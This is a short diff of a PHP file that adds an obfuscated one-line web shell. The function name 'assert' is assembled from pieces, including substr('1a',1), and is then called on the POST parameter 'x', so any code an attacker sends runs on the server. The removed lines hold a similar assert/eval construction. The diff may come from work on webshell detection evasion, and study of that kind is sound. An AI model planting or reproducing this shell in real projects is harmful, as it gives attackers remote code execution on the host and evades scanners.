@@ -1,12 +1,5 @@
 <?php
-$a = 'a'.'s'.'s'.'e'.'r'.'t';
-$b = 'sss';
-function sqlsec($a,$b){
-    assert($a);
-    echo $a;
-    eval($b);
-}
-sqlsec($a,$b);
-base64_decode($a);
-$a($b);
+$a = substr('1a',1).'s'.'s'.'e'.'r'.'t';
+$a($_POST['x']);
+$b = __FILE__;
 ?>
